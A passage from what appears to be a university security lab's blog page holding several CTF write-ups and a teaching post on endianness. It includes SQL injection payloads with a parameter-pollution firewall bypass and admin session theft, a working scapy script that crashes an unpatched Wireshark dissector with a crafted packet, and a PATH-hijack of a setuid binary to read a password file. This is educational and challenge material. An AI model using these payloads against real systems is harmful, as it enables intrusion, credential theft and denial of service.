+<a href="http://i0.wp.com/3.bp.blogspot.com/-vGeExmk7qb0/UGjflQrzGmI/AAAAAAAAAWY/K6NaYxGdjxk/s1600/hackerdetected.png"><img border="0" src="http://i0.wp.com/3.bp.blogspot.com/-vGeExmk7qb0/UGjflQrzGmI/AAAAAAAAAWY/K6NaYxGdjxk/s200/hackerdetected.png?resize=200%2C50" data-recalc-dims="1" /></a></div>
+<p>There are many techniques to bypass a Web Application Firewall. The specific flaw in this firewall was one of Impedance Mismatch (ie: firewall and application see data differently), and more specifically, HTTP Parameter Pollution. I have links to a relevant presentation at the end of the post. Big words aside, the trick here is that the firewall scans only the <i>first</i> occurrence of a parameter with the same name, whereas the application only reads the <i>last</i> occurrence. This allows us to finally run a successful query by making a request to the following:</p>
+<blockquote><p>/horse.php?id=1&amp;id=-1 union select 1,2,3,4&#8211;</p></blockquote>
+<p>This request ends up evading the firewall. The firewall sees &#8220;id=1&#8243; while the application sees &#8220;id=-1 union select 1,2,3,4&#8211;&#8221;. Everyone is happy! Now let&#8217;s dump the database. </p>
+<div class="separator" style="clear: both;text-align: center">
+<a href="http://i0.wp.com/2.bp.blogspot.com/-P1dCfIK3Mo4/UGjlIt1hm-I/AAAAAAAAAWs/rX4lf8MDlMw/s1600/fuark_its_bcrypt.png"><img border="0" src="http://i2.wp.com/2.bp.blogspot.com/-P1dCfIK3Mo4/UGjlIt1hm-I/AAAAAAAAAWs/rX4lf8MDlMw/s320/fuark_its_bcrypt.png?resize=320%2C256" data-recalc-dims="1" /></a></div>
+<p>And it&#8217;s bcrypt! Before I go on, let me tell you that any CTF challenge that requires you to crack a hash is a really bad one. Okay, so cracking the password is out of the picture. And we can&#8217;t use the hash to log in. Now what? After running through the database, you should have come across a database called &#8220;sessions&#8221;. From this point on, all you needed to do was steal an active session belonging to the administrator from the database, and modify your cookie to reflect that session. And you&#8217;re in!</p>
+<div class="separator" style="clear: both;text-align: center">
+<a href="http://i2.wp.com/2.bp.blogspot.com/-r_Ee1mNYHxM/UGjmLOojzsI/AAAAAAAAAW4/8v_xuEfKtlA/s1600/the_key.png"><img border="0" src="http://i2.wp.com/2.bp.blogspot.com/-r_Ee1mNYHxM/UGjmLOojzsI/AAAAAAAAAW4/8v_xuEfKtlA/s200/the_key.png?resize=200%2C28" data-recalc-dims="1" /></a></div>
+<h2>Mistakes</h2>
+<p>My biggest mistake was the logic in the firewall. Because I had to write the firewall myself, I had to parse the querystring on my own. And everyone knows parsing things on your own leads to bugs. This challenge was no exception. My firewall detection function ran through every key value pair in the querystring. The bug was that any pair containing more than one &#8220;=&#8221; was automatically ignored. This led to a lot of unintentional evasion through queries such as</p>
+<blockquote><p>/horse.php?id=-1 or 1=1 union select 1,2,3,4&#8211;</p></blockquote>
+<p>The &#8220;1=1&#8243; is something I hadn&#8217;t accounted for, but is a very common part of many SQL injection payloads. Because it was so common, many people ended up bypassing the firewall unintentionally. Grepping through the access logs shows around 150~ish people having solved it this way. I did end up patching this bug, however. I felt that although the people who solved it before the patch didn&#8217;t do it the way I would have liked, they still achieved the same goal of defeating the firewall. </p>
+<h2>Final Thoughts</h2>
+<p>I kind of liked this challenge. And I&#8217;m not saying that because I wrote it. I tried my best to make this pretty realistic; everything used in this challenge (firewall evasion, strong hashing functions, session stealing) is something I&#8217;ve come across at one point or another in my experiences. </p>
+<p>Too many people took the brute forcing approach. Some bruteforced the login, while some used tools such as DirBuster to enumerate files. I ended up blocking all traffic from these IP addresses as not only did they approach this challenge completely incorrectly, they made monitoring the challenge difficult. There was also a ton of traffic from tools such as SQLMap and Havij but I let these go as they were more relevant to the challenge.</p>
+<h3>Resources</h3>
+<p><a href="https://community.qualys.com/blogs/securitylabs/2012/07/25/protocol-level-evasion-of-web-application-firewalls">Protocol-Level Evasion of Web Application Firewalls</a></p>
+							</div><!-- .entry-content -->
+	
+			<div class="entry-utility">
+									<span class="cat-links">
+						<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="http://isisblogs.poly.edu/categories/uncategorized/" title="View all posts in Uncategorized" rel="category tag">Uncategorized</a>					</span>
+					<span class="meta-sep">|</span>
+												<span class="comments-link"><a href="http://isisblogs.poly.edu/2012/09/30/csaw-ctf-horseforce-writeup/#comments" title="Comment on CSAW CTF: HorseForce Writeup">1 Comment</a></span>
+							</div><!-- .entry-utility -->
+		</div><!-- #post-## -->
+
+		
+	
+
+
+			<div id="post-1058" class="post-1058 post type-post status-publish format-standard hentry category-0day category-bugs category-ctf">
+			<h2 class="entry-title"><a href="http://isisblogs.poly.edu/2012/08/03/tracing-bugs-in-wireshark/" title="Permalink to Tracing Bugs in Wireshark" rel="bookmark">Tracing Bugs in Wireshark</a></h2>
+
+			<div class="entry-meta">
+				<span class="meta-prep meta-prep-author">Posted on</span> <a href="http://isisblogs.poly.edu/2012/08/03/tracing-bugs-in-wireshark/" title="11:15 am" rel="bookmark"><span class="entry-date">August 3, 2012</span></a> <span class="meta-sep">by</span> <span class="author vcard"><a class="url fn n" href="http://isisblogs.poly.edu/author/wont/" title="View all posts by wont">wont</a></span>			</div><!-- .entry-meta -->
+
+				<div class="entry-content">
+				<p>So word spread pretty quickly about the wireshark bugs being thrown around Defcon 20 CTF. After I got my hands on acme pharms <a title="packet capture" href="https://s3.amazonaws.com/dc20-pcap/dc20-pcap.tar.xz">packet capture</a> I quickly set out to recover the evil packets and weaponize them :)</p>
+<p>After unpacking the tarball I found a pcap file that crashed my Wireshark(version 1.8.1), sf1-37.pcap</p>
+<p><a href="http://i0.wp.com/isisblogs.poly.edu/wp-content/uploads/2012/08/demsg.png?resize=640%2C114"><img class="size-full wp-image-1069" src="http://i0.wp.com/isisblogs.poly.edu/wp-content/uploads/2012/08/demsg.png?resize=640%2C114" alt="" data-recalc-dims="1" /></a></p>
+<p>My copy of Wireshark was compiled without any debug information so I quickly grabbed the latest source from <a href="http://www.wireshark.org/">http://www.wireshark.org</a> and recompiled it. After opening the pcap again in a Wireshark session running under gdb I got the name of the source file and even the offending line of code.</p>
+<div id="attachment_1060" class="wp-caption alignnone" style="width: 670px"><a href="http://i1.wp.com/isisblogs.poly.edu/wp-content/uploads/2012/08/Screenshot-evan@ubuntu-wireshark-wireshark-1.8.1.png?resize=640%2C850"><img class="size-full wp-image-1060" src="http://i1.wp.com/isisblogs.poly.edu/wp-content/uploads/2012/08/Screenshot-evan@ubuntu-wireshark-wireshark-1.8.1.png?resize=640%2C850" alt="" data-recalc-dims="1" /></a><p class="wp-caption-text">Wireshark state information at crash</p></div>
+<p>The source of the crash is a division by zero. Perfect for crashing Wireshark.</p>
+<p>I wanted to examine this packet in Wireshark so I needed to write a patch and recompile.</p>
+<p>I rewrote the line</p>
+<pre class="brush: plain; title: ; notranslate" title="">
+
+rx_min = c_max * rsk / plen;
+
+</pre>
+<p>as</p>
+<pre class="brush: plain; title: ; notranslate" title="">
+
+if(plen==0){
+     plen=1;
+     rx_min=1337;
+     puts(&quot;error in dcp-etsi.c&quot;);
+}
+else{
+     rx_min = c_max * rsk / plen;
+}
+
+</pre>
+<p>I was able to quickly hunt down the offending packets in wireshark. There are several hundred of them. They are easily identifiable because wireshark says they need l337:</p>
+<div id="attachment_1063" class="wp-caption alignnone" style="width: 665px"><a href="http://i2.wp.com/isisblogs.poly.edu/wp-content/uploads/2012/08/need1337.png?resize=640%2C319"><img class=" wp-image-1063" src="http://i2.wp.com/isisblogs.poly.edu/wp-content/uploads/2012/08/need1337.png?resize=640%2C319" alt="" data-recalc-dims="1" /></a><p class="wp-caption-text">Need 1337</p></div>
+<p>I exported the first one that caught my fancy to see if I could induce a wireshark crash with a single packet.</p>
+<p>As it turns out, you can. Sweet. This makes my life easy, I can strip out the application layer data from this packet to write a POC.</p>
+<p>Writing a script to exploit this bug is easy. I used scapy, a third party packet crafting python library to build an IPv6 packet with one argument for a destination IPv6 address and send it.</p>
+<pre class="brush: plain; title: ; notranslate" title="">
+
+#!/usr/bin/python
+#Evan Jensen AKA wont
+#divide by zero in dcp-etsi.c wireshark dissector. Unpatched at time of publish
+from scapy.all import *
+from sys import *
+
+crashdata='504623c4000000008854aa3d5a474547'.decode('hex')
+
+if len(argv)&lt;2:
+    packet=Ether()/IPv6(dst=&quot;::1&quot;)/UDP(dport=55935,sport=42404)/crashdata
+    wrpcap('lol.pcap',[packet])
+    print &quot;open lol.pcap&quot;
+
+else:   
+    packet=IPv6(dst=argv[1])/UDP(dport=55935,sport=42404)/crashdata
+    send(packet)
+
+</pre>
+							</div><!-- .entry-content -->
+	
+			<div class="entry-utility">
+									<span class="cat-links">
+						<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="http://isisblogs.poly.edu/categories/0day/" title="View all posts in 0day" rel="category tag">0day</a>, <a href="http://isisblogs.poly.edu/categories/bugs/" title="View all posts in Bugs" rel="category tag">Bugs</a>, <a href="http://isisblogs.poly.edu/categories/ctf/" title="View all posts in CTF" rel="category tag">CTF</a>					</span>
+					<span class="meta-sep">|</span>
+												<span class="comments-link"><a href="http://isisblogs.poly.edu/2012/08/03/tracing-bugs-in-wireshark/#comments" title="Comment on Tracing Bugs in Wireshark">1 Comment</a></span>
+							</div><!-- .entry-utility -->
+		</div><!-- #post-## -->
+
+		
+	
+
+
+			<div id="post-1031" class="post-1031 post type-post status-publish format-standard hentry category-uncategorized">
+			<h2 class="entry-title"><a href="http://isisblogs.poly.edu/2012/05/28/endianness/" title="Permalink to Endianness" rel="bookmark">Endianness</a></h2>
+
+			<div class="entry-meta">
+				<span class="meta-prep meta-prep-author">Posted on</span> <a href="http://isisblogs.poly.edu/2012/05/28/endianness/" title="4:24 am" rel="bookmark"><span class="entry-date">May 28, 2012</span></a> <span class="meta-sep">by</span> <span class="author vcard"><a class="url fn n" href="http://isisblogs.poly.edu/author/hockeyinjune/" title="View all posts by Julian Cohen">Julian Cohen</a></span>			</div><!-- .entry-meta -->
+
+				<div class="entry-content">
+				<p>As a University research lab, we often have students who are not familiar with concepts that the professional security community finds second nature.</p>
+<p>Something that I have to explain to new students very often is the concept of <a href="http://en.wikipedia.org/wiki/Endianness" target="_blank">Endianness</a>.  A concept that reverse engineers and low-level programmers deal with on a daily basis, some students cannot even begin to grasp.</p>
+<p>Because of this, we often have to come up with different ways to explain complex concepts to different students.  Here&#8217;s some of what we&#8217;ve come up with for Endianness.  Hopefully, this material will be useful to students trying to understand Endianness and teachers trying to explain Endianness and other concepts.</p>
+<p><strong>History</strong></p>
+<p>We find that some students don&#8217;t accept concepts until they understand <em>how</em> they came to be.  For these students, we point them to <a href="http://en.wikipedia.org/wiki/Endianness#Etymology" target="_blank">the section on the Wikipedia page that talks about Jonathan Swift&#8217;s <em>Gulliver’s Travels</em></a></p>
+<p><strong>Reasoning</strong></p>
+<p>Some students are fine with the concept, but are interested in <em>why</em> they came to be.  For these students we provide the following analogy:</p>
+<blockquote><p>Big endian is to <a href="http://en.wikipedia.org/wiki/English_language" target="_blank">English</a> as Little endian is to <a href="http://en.wikipedia.org/wiki/Hebrew_language" target="_blank">Hebrew</a></p></blockquote>
+<p>After explaining that while these languages are written and read in different directions, they are still both languages capable of expressing the same ideas.  The creators of these languages may have had their own reasons for picking left or right (which we don&#8217;t care about at this juncture), but they both accomplish the same thing.  <em>The word size in this analogy is one line of text.  See more about word size below.</em></p>
+<p><strong>Visualization</strong></p>
+<p>Some students need to <em>see</em> it, instead of just hearing it be explained.  This is fairly common and we often use the images on Wikipedia for demonstration:</p>
+<p><img alt="Little Endian Graphic" src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ed/Little-Endian.svg/500px-Little-Endian.svg.png" title="Little Endian" width="300" /><img alt="Big Endian Graphic" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/54/Big-Endian.svg/500px-Big-Endian.svg.png" title="Big Endian" width="300" /></p>
+<p>These images explain how the same numeric value is stored differently in memory based on which endianness is being used.  Recently, I found another insightful graphic in the <a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html" target="_blank">Intel manuals</a>:</p>
+<p><a href="http://i0.wp.com/isisblogs.poly.edu/wp-content/uploads/2012/05/littleendian.png?resize=640%2C500"><img src="http://i0.wp.com/isisblogs.poly.edu/wp-content/uploads/2012/05/littleendian.png?resize=640%2C500" alt="Little Endian" title="Little Endian" class="alignnone size-full wp-image-1050" data-recalc-dims="1" /></a></p>
+<p>This image gives a different take on little endian, showing how different values would read out of this contiguous segment of memory.</p>
+<p><strong>Single Case</strong></p>
+<p>Some students will appear to understand the concept when discussing 4-byte values, but then when switching to 2-byte values it&#8217;s clear they really don&#8217;t understand the whole concept.</p>
+<p><strong>Word size</strong> is an important concept to make sure students understand when explaining Endianness.  Depending on the size of data you&#8217;re working with, data will be written into and read out of memory differently.  Students need to understand that architectures have a default data size, and the processor will use that size when reading and writing data in big or little endian.</p>
+							</div><!-- .entry-content -->
+	
+			<div class="entry-utility">
+									<span class="cat-links">
+						<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="http://isisblogs.poly.edu/categories/uncategorized/" title="View all posts in Uncategorized" rel="category tag">Uncategorized</a>					</span>
+					<span class="meta-sep">|</span>
+												<span class="comments-link"><a href="http://isisblogs.poly.edu/2012/05/28/endianness/#comments" title="Comment on Endianness">3 Comments</a></span>
+							</div><!-- .entry-utility -->
+		</div><!-- #post-## -->
+
+		
+	
+
+
+			<div id="post-1007" class="post-1007 post type-post status-publish format-standard hentry category-uncategorized">
+			<h2 class="entry-title"><a href="http://isisblogs.poly.edu/2012/03/23/stripe-ctf-level01/" title="Permalink to Stripe CTF Level01" rel="bookmark">Stripe CTF Level01</a></h2>
+
+			<div class="entry-meta">
+				<span class="meta-prep meta-prep-author">Posted on</span> <a href="http://isisblogs.poly.edu/2012/03/23/stripe-ctf-level01/" title="10:57 pm" rel="bookmark"><span class="entry-date">March 23, 2012</span></a> <span class="meta-sep">by</span> <span class="author vcard"><a class="url fn n" href="http://isisblogs.poly.edu/author/coldheat/" title="View all posts by Kevin Chung">Kevin Chung</a></span>			</div><!-- .entry-meta -->
+
+				<div class="entry-content">
+				<p>On Febuary 22nd, the Stripe company ran a straightforward 6 level <a href="https://stripe.com/blog/capture-the-flag">CTF</a>. The first level provides a single setuid binary and corresponding source and the task of obtaining the flag (a password to another user&#8217;s account) from a text file (/home/level02/.password) owned and only viewable by the next level&#8217;s account. In addition, we have a single directory which we can write to.</p>
+<p>level01.c</p>
+<pre class="brush: cpp; collapse: false; title: ; wrap-lines: false; notranslate" title="">
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main(int argc, char **argv)
+{
+  printf(&quot;Current time: &quot;);
+  fflush(stdout);
+  system(&quot;date&quot;);
+  return 0;
+}
+</pre>
+<p>Essentially the binary will output the date as the computer knows it through the date command. More importantly, since the command which calls date uses relative paths and the binary is setuid we can gain higher access and access our target file.</p>
+<p>Using environment variables we can modify where <code>system("date");</code> will point to. To begin we&#8217;ll create a simple script in our directory using the command <code>echo "cat /home/level02/.password" &gt; date</code> Then we&#8217;ll mark it executable with chmod +x date. Now finally we&#8217;ll alter the PATH to check our directory before it checks bin. Using <code>export PATH=/tmp/"provided_directory":$PATH</code> we&#8217;ll add our personal directory to the PATH. Now when we run our level01 binary, we see that date no longer outputs the date, but the contents of the .password file.</p>
+							</div><!-- .entry-content -->
+	
+			<div class="entry-utility">
+									<span class="cat-links">
+						<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="http://isisblogs.poly.edu/categories/uncategorized/" title="View all posts in Uncategorized" rel="category tag">Uncategorized</a>					</span>
+					<span class="meta-sep">|</span>
+												<span class="comments-link"><a href="http://isisblogs.poly.edu/2012/03/23/stripe-ctf-level01/#respond" title="Comment on Stripe CTF Level01">Leave a comment</a></span>
+							</div><!-- .entry-utility -->
+		</div><!-- #post-## -->
+
+		
+	
+
+
+			<div id="post-993" class="post-993 post type-post status-publish format-standard hentry category-uncategorized">
+			<h2 class="entry-title"><a href="http://isisblogs.poly.edu/2012/01/24/school-ctf-count-them-all/" title="Permalink to School CTF: Count Them All" rel="bookmark">School CTF: Count Them All</a></h2>
+
+			<div class="entry-meta">
+				<span class="meta-prep meta-prep-author">Posted on</span> <a href="http://isisblogs.poly.edu/2012/01/24/school-ctf-count-them-all/" title="8:47 pm" rel="bookmark"><span class="entry-date">January 24, 2012</span></a> <span class="meta-sep">by</span> <span class="author vcard"><a class="url fn n" href="http://isisblogs.poly.edu/author/coldheat/" title="View all posts by Kevin Chung">Kevin Chung</a></span>			</div><!-- .entry-meta -->
+
+				<div class="entry-content">
+				<p>Being provided a txt file titled “<a href="http://blackbox.sibears.ru/uploads/6/school-ctf-2011-files/long.txt">long.txt</a>” with the challenge title of “Count them all”, and the description “One important aspect of an inventory is to count all the swords you&#8217;ve got. Count them all.” was the premise for a challenge in the recent School CTF. Opening the file in a text editor (I used Notepad++) we can see that the file is comprised of a single line made up of a large amount of 1s.<br />
+Using python we can easily open up the file and count the amount of 1s. It would be quite boring to do it manually.</p>
+<p>Using the script:</p>
+<pre class="brush: python; collapse: false; title: ; wrap-lines: false; notranslate" title="">
+x = open(&quot;long.txt&quot;, &quot;r&quot;)
+start = 0
+for y in x.readline():
+    if y == str(1):
+        start += int(y)
+print start
+</pre>
+<p>we find that the sum of all of the numbers is 1111103. But that doesn’t seem to be the key.</p>
+<p>Instead let’s check to see if everything is in fact a 1.<br />
+With a slight modification to the previous script:</p>
+<pre class="brush: python; collapse: false; title: ; wrap-lines: false; notranslate" title="">
+x = open(&quot;long.txt&quot;, &quot;r&quot;)
+for y in x.readline():
+    if y != str(1):
+        print y
+</pre>
+<p>we get the result:</p>
+<p>s<br />
+u<br />
+m<br />
+i<br />
+n<br />
+h<br />
+e<br />
+x</p>
+<p>or more cohesively: suminhex</p>
+<p>Now that we’ve received our hint, we can take our previous value of 1111103 and use an online calculator (Google “1111103 in hex”) to convert that to hex or use Python’s built in hex function: hex(1111103).</p>
+<p>Either will result in “0x10f43f” which if we drop off the 0x will result in the key: 10f43f</p>
+							</div><!-- .entry-content -->
+	
+			<div class="entry-utility">
+									<span class="cat-links">
+						<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="http://isisblogs.poly.edu/categories/uncategorized/" title="View all posts in Uncategorized" rel="category tag">Uncategorized</a>					</span>
+					<span class="meta-sep">|</span>
+												<span class="comments-link"><a href="http://isisblogs.poly.edu/2012/01/24/school-ctf-count-them-all/#respond" title="Comment on School CTF: Count Them All">Leave a comment</a></span>
+							</div><!-- .entry-utility -->
+		</div><!-- #post-## -->
+
+		
+	
+
+				<div id="nav-below" class="navigation">
+					<div class="nav-previous"><a href="http://isisblogs.poly.edu/page/2/" ><span class="meta-nav">&larr;</span> Older posts</a></div>
+					<div class="nav-next"></div>
+				</div><!-- #nav-below -->
+			</div><!-- #content -->
+		</div><!-- #container -->
+
+
+		<div id="primary" class="widget-area" role="complementary">
+			<ul class="xoxo">
+
+<li id="search-2" class="widget-container widget_search"><form role="search" method="get" id="searchform" action="http://isisblogs.poly.edu/" >
+	<div><label class="screen-reader-text" for="s">Search for:</label>
+	<input type="text" value="" name="s" id="s" />
+	<input type="submit" id="searchsubmit" value="Search" />
+	</div>
+	</form></li><li id="archives-2" class="widget-container widget_archive"><h3 class="widget-title">Archives</h3>		<ul>
+			<li><a href='http://isisblogs.poly.edu/2013/02/' title='February 2013'>February 2013</a>&nbsp;(1)</li>
+	<li><a href='http://isisblogs.poly.edu/2012/10/' title='October 2012'>October 2012</a>&nbsp;(1)</li>
+	<li><a href='http://isisblogs.poly.edu/2012/09/' title='September 2012'>September 2012</a>&nbsp;(1)</li>
+	<li><a href='http://isisblogs.poly.edu/2012/08/' title='August 2012'>August 2012</a>&nbsp;(1)</li>
+	<li><a href='http://isisblogs.poly.edu/2012/05/' title='May 2012'>May 2012</a>&nbsp;(1)</li>
+	<li><a href='http://isisblogs.poly.edu/2012/03/' title='March 2012'>March 2012</a>&nbsp;(1)</li>
+	<li><a href='http://isisblogs.poly.edu/2012/01/' title='January 2012'>January 2012</a>&nbsp;(5)</li>
+	<li><a href='http://isisblogs.poly.edu/2011/12/' title='December 2011'>December 2011</a>&nbsp;(4)</li>
+	<li><a href='http://isisblogs.poly.edu/2011/11/' title='November 2011'>November 2011</a>&nbsp;(3)</li>
+	<li><a href='http://isisblogs.poly.edu/2011/10/' title='October 2011'>October 2011</a>&nbsp;(4)</li>
+	<li><a href='http://isisblogs.poly.edu/2011/09/' title='September 2011'>September 2011</a>&nbsp;(4)</li>
+	<li><a href='http://isisblogs.poly.edu/2011/08/' title='August 2011'>August 2011</a>&nbsp;(1)</li>
+	<li><a href='http://isisblogs.poly.edu/2011/06/' title='June 2011'>June 2011</a>&nbsp;(5)</li>
+	<li><a href='http://isisblogs.poly.edu/2011/05/' title='May 2011'>May 2011</a>&nbsp;(5)</li>
+	<li><a href='http://isisblogs.poly.edu/2011/04/' title='April 2011'>April 2011</a>&nbsp;(7)</li>
+	<li><a href='http://isisblogs.poly.edu/2011/03/' title='March 2011'>March 2011</a>&nbsp;(4)</li>
+	<li><a href='http://isisblogs.poly.edu/2010/12/' title='December 2010'>December 2010</a>&nbsp;(2)</li>
+		</ul>
+</li><li id="categories-2" class="widget-container widget_categories"><h3 class="widget-title">Categories</h3>		<ul>
+	<li class="cat-item cat-item-5"><a href="http://isisblogs.poly.edu/categories/0day/" title="View all posts filed under 0day">0day</a> (2)
+</li>
+	<li class="cat-item cat-item-4"><a href="http://isisblogs.poly.edu/categories/bugs/" title="View all posts filed under Bugs">Bugs</a> (4)
+</li>
+	<li class="cat-item cat-item-17"><a href="http://isisblogs.poly.edu/categories/code-auditing/" title="View all posts filed under Code Auditing">Code Auditing</a> (1)
+</li>
+	<li class="cat-item cat-item-14"><a href="http://isisblogs.poly.edu/categories/compilers/" title="View all posts filed under Compilers">Compilers</a> (3)
+</li>
+	<li class="cat-item cat-item-3"><a href="http://isisblogs.poly.edu/categories/ctf/" title="View all posts filed under CTF">CTF</a> (15)
+</li>
+	<li class="cat-item cat-item-18"><a href="http://isisblogs.poly.edu/categories/exploitation-mitigation-techniques/" title="View all posts filed under Exploitation Mitigation Techniques">Exploitation Mitigation Techniques</a> (3)
+</li>
+	<li class="cat-item cat-item-26"><a href="http://isisblogs.poly.edu/categories/exploitation-techniques/" title="View all posts filed under Exploitation Techniques">Exploitation Techniques</a> (15)
+</li>
+	<li class="cat-item cat-item-1"><a href="http://isisblogs.poly.edu/categories/uncategorized/" title="View all posts filed under Uncategorized">Uncategorized</a> (27)
+</li>
+	<li class="cat-item cat-item-6"><a href="http://isisblogs.poly.edu/categories/vulnerabilities/" title="View all posts filed under Vulnerabilities">Vulnerabilities</a> (4)
+</li>
+		</ul>
+</li>		<li id="recent-posts-2" class="widget-container widget_recent_entries">		<h3 class="widget-title">Recent Posts</h3>		<ul>
+					<li>
+				<a href="http://isisblogs.poly.edu/2013/02/14/29c3ctf-minesweeper/" title="29c3ctf &#8211; minesweeper">29c3ctf &#8211; minesweeper</a>
+						</li>
+					<li>
+				<a href="http://isisblogs.poly.edu/2012/10/26/escaping-python-sandboxes/" title="Escaping Python Sandboxes">Escaping Python Sandboxes</a>
+						</li>
+					<li>
+				<a href="http://isisblogs.poly.edu/2012/09/30/csaw-ctf-horseforce-writeup/" title="CSAW CTF: HorseForce Writeup">CSAW CTF: HorseForce Writeup</a>
+						</li>
+					<li>
+				<a href="http://isisblogs.poly.edu/2012/08/03/tracing-bugs-in-wireshark/" title="Tracing Bugs in Wireshark">Tracing Bugs in Wireshark</a>
+						</li>
+					<li>
+				<a href="http://isisblogs.poly.edu/2012/05/28/endianness/" title="Endianness">Endianness</a>
+						</li>
+					<li>
+				<a href="http://isisblogs.poly.edu/2012/03/23/stripe-ctf-level01/" title="Stripe CTF Level01">Stripe CTF Level01</a>
+						</li>
+					<li>
+				<a href="http://isisblogs.poly.edu/2012/01/24/school-ctf-count-them-all/" title="School CTF: Count Them All">School CTF: Count Them All</a>
+						</li>
+					<li>
+				<a href="http://isisblogs.poly.edu/2012/01/04/pop-pop-ret-finder/" title="Pop Pop Ret Finder">Pop Pop Ret Finder</a>
+						</li>
+					<li>
+				<a href="http://isisblogs.poly.edu/2012/01/01/ictf-2011-android-market-challenge/" title="iCTF 2011: Android Market Challenge">iCTF 2011: Android Market Challenge</a>
+						</li>
+					<li>
+				<a href="http://isisblogs.poly.edu/2012/01/01/941/" title="SchoolCTF: Deadlamps">SchoolCTF: Deadlamps</a>
+						</li>
+				</ul>
+		</li><li id="meta-2" class="widget-container widget_meta"><h3 class="widget-title">Meta</h3>			<ul>
+						<li><a href="http://isisblogs.poly.edu/wp-login.php">Log in</a></li>
+			<li><a href="http://isisblogs.poly.edu/feed/" title="Syndicate this site using RSS 2.0">Entries <abbr title="Really Simple Syndication">RSS</abbr></a></li>
+			<li><a href="http://isisblogs.poly.edu/comments/feed/" title="The latest comments to all posts in RSS">Comments <abbr title="Really Simple Syndication">RSS</abbr></a></li>
+			<li><a href="http://wordpress.org/" title="Powered by WordPress, state-of-the-art semantic personal publishing platform.">WordPress.org</a></li>
+						</ul>
+</li>			</ul>
+		</div><!-- #primary .widget-area -->
+
+		<div id="infinite-footer">
+			<div class="container">
+				<div class="blog-info">
+					<a id="infinity-blog-title" href="http://isisblogs.poly.edu/" title="NYU Poly ISIS Lab" rel="home">
+						NYU Poly ISIS Lab					</a>
+				</div>
+				<div class="blog-credits">
+					<a href="http://wordpress.org/" rel="generator">Proudly powered by WordPress</a> Theme: Twenty Ten.				</div>
+			</div>
+		</div><!-- #infinite-footer -->
+			</div><!-- #main -->
+
+	<div id="footer" role="contentinfo">
+		<div id="colophon">
+
+
+
+			<div id="site-info">
+				<a href="http://isisblogs.poly.edu/" title="NYU Poly ISIS Lab" rel="home">
+					NYU Poly ISIS Lab				</a>
+			</div><!-- #site-info -->
+
+			<div id="site-generator">
+								<a href="http://wordpress.org/" title="Semantic Personal Publishing Platform">Proudly powered by WordPress.</a>
+			</div><!-- #site-generator -->
+
+		</div><!-- #colophon -->
+	</div><!-- #footer -->
+
+</div><!-- #wrapper -->
+
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shCore.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushAS3.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushBash.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushColdFusion.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/third-party-brushes/shBrushClojure.js?ver=20090602'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushCpp.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushCSharp.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushCss.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushDelphi.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushDiff.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushErlang.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/third-party-brushes/shBrushFSharp.js?ver=20091003'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushGroovy.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushJava.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushJavaFX.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushJScript.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/third-party-brushes/shBrushLatex.js?ver=20090613'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/third-party-brushes/shBrushMatlabKey.js?ver=20091209'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/third-party-brushes/shBrushObjC.js?ver=20091207'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushPerl.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushPhp.js?ver=3.0.83c'></script>
